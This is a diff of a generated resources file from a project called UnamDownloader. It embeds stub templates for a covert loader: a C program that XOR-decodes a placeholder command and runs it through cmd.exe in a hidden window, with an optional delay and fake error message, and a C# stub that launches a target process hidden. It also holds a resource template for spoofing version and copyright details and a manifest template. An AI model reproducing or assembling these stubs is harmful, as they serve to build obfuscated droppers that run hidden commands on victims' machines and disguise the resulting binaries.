@@ -63,9 +63,9 @@ namespace UnamDownloader.Properties {
         /// <summary>
         ///   Looks up a localized resource of type System.Byte[].
         /// </summary>
-        internal static byte[] administrator {
+        internal static byte[] Compilers {
             get {
-                object obj = ResourceManager.GetObject("administrator", resourceCulture);
+                object obj = ResourceManager.GetObject("Compilers", resourceCulture);
                 return ((byte[])(obj));
             }
         }
@@ -81,42 +81,56 @@ namespace UnamDownloader.Properties {
         }
         
         /// <summary>
-        ///   Looks up a localized resource of type System.Byte[].
+        ///   Looks up a localized string similar to #include &lt;windows.h&gt;
+        ///#include &lt;ShellAPI.h&gt;
+        ///
+        ////* Created by Unam Sanctam, https://github.com/UnamSanctam */
+        ///
+        ///int main(int argc, char **argv) 
+        ///{
+        ///#if DefError
+        ///	run_program(NULL, cipher(&quot;#ERRORCOMMAND&quot;, #ERRORCOMMANDLENGTH));
+        ///#endif
+        ///#if DefDelay
+        ///	sleep(#DELAY * 1000);
+        ///#endif
+        ///	char* output = (char*)malloc(sizeof(char) * #LENGTH+1);
+        ///	output[#LENGTH] = 0;
+        ///	for (int i = 0; i &lt; #LENGTH; ++i) {
+        ///		output[i] = &quot;#COMMAND&quot;[i] ^ &quot;#KEY&quot;[i % #KEYLENGTH];
+        ///	}
+        ///	ShellExecuteA(NULL, &quot;open&quot;, &quot;cmd.exe&quot;, output, NULL, SW_HIDE);
+        ///	ret [rest of string was truncated]&quot;;.
         /// </summary>
-        internal static byte[] MinGW64 {
+        internal static string ProgramC {
             get {
-                object obj = ResourceManager.GetObject("MinGW64", resourceCulture);
-                return ((byte[])(obj));
+                return ResourceManager.GetString("ProgramC", resourceCulture);
             }
         }
         
         /// <summary>
-        ///   Looks up a localized string similar to #include &lt;windows.h&gt;
-        ///#include &lt;stdlib.h&gt;
+        ///   Looks up a localized string similar to using System;
+        ///using System.Diagnostics;
         ///
-        ////* Created by Unam Sanctam, https://github.com/UnamSanctam */
-        ///
-        ///char* cipher(char* data, char* key, int dataLen) {
-        ///	int keyLen = strlen(key);
-        ///	char* output = (char*)malloc(sizeof(char) * dataLen+1);
-        ///	output[dataLen] = 0;
-        ///	for (int i = 0; i &lt; dataLen; ++i) {
-        ///		output[i] = data[i] ^ key[i % keyLen];
-        ///	}
-        ///	return output;
-        ///}
-        ///
-        ///int main(int argc, char **argv) 
+        ///namespace Program
         ///{
-        ///	PROCESS_INFORMATION p_info;
-        ///	STARTUPINFO s_info;
-        ///
-        ///	memset(&amp;s_info, 0, sizeof(s_info));
-        ///	memset(&amp;p_info, 0, sizeof( [rest of string was truncated]&quot;;.
+        ///    static class Program
+        ///    {
+        ///        Process.Start(new ProcessStartInfo
+        ///        {
+        ///            FileName = #TARGET,
+        ///            Arguments = #ARGUMENTS,
+        ///            WorkingDirectory = Environment.SystemDirectory,
+        ///            WindowStyle = ProcessWindowStyle.Hidden,
+        ///            CreateNoWindow = true
+        ///        });
+        ///    }
+        ///}
+        ///.
         /// </summary>
-        internal static string Program1 {
+        internal static string ProgramCS {
             get {
-                return ResourceManager.GetString("Program1", resourceCulture);
+                return ResourceManager.GetString("ProgramCS", resourceCulture);
             }
         }
         
@@ -124,9 +138,7 @@ namespace UnamDownloader.Properties {
         ///   Looks up a localized string similar to #ifdef DefIcon
         ///MAINICON ICON &quot;#ICON&quot;
         ///#endif
-        ///#ifdef DefAdmin
-        ///1 24 &quot;administrator.manifest&quot;
-        ///#endif
+        ///1 24 &quot;loader.manifest&quot;
         ///#ifdef DefAssembly
         ///1 VERSIONINFO
         ///FILEVERSION     #VERSION
@@ -141,7 +153,8 @@ namespace UnamDownloader.Properties {
         ///            VALUE &quot;FileDescription&quot;, &quot;#DESCRIPTION&quot;
         ///            VALUE &quot;FileVersion&quot;, &quot;#VERSION&quot;
         ///            VALUE &quot;LegalCopyright&quot;, &quot;#COPYRIGHT&quot;
-        ///			VALUE &quot; [rest of string was truncated]&quot;;.
+        ///			VALUE &quot;LegalTrademark&quot;, &quot;#TRADEMARK&quot;
+        ///  [rest of string was truncated]&quot;;.
         /// </summary>
         internal static string resource {
             get {
@@ -150,12 +163,17 @@ namespace UnamDownloader.Properties {
         }
         
         /// <summary>
-        ///   Looks up a localized resource of type System.Byte[].
+        ///   Looks up a localized string similar to &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt; 
+        ///&lt;asmv1:assembly manifestVersion=&quot;1.0&quot; xmlns=&quot;urn:schemas-microsoft-com:asm.v1&quot; xmlns:asmv1=&quot;urn:schemas-microsoft-com:asm.v1&quot; xmlns:asmv2=&quot;urn:schemas-microsoft-com:asm.v2&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;&gt;
+        ///    &lt;assemblyIdentity version=&quot;#MANIFESTVERSION&quot; name=&quot;#MANIFESTNAME&quot; /&gt;
+        ///    &lt;trustInfo xmlns=&quot;urn:schemas-microsoft-com:asm.v2&quot;&gt;
+        ///        &lt;security&gt;
+        ///            &lt;requestedPrivileges xmlns=&quot;urn:schemas-microsoft-com:asm.v3&quot;&gt;
+        ///                &lt;re [rest of string was truncated]&quot;;.
         /// </summary>
-        internal static byte[] tinycc {
+        internal static string template {
             get {
-                object obj = ResourceManager.GetObject("tinycc", resourceCulture);
-                return ((byte[])(obj));
+                return ResourceManager.GetString("template", resourceCulture);
             }
         }
     }
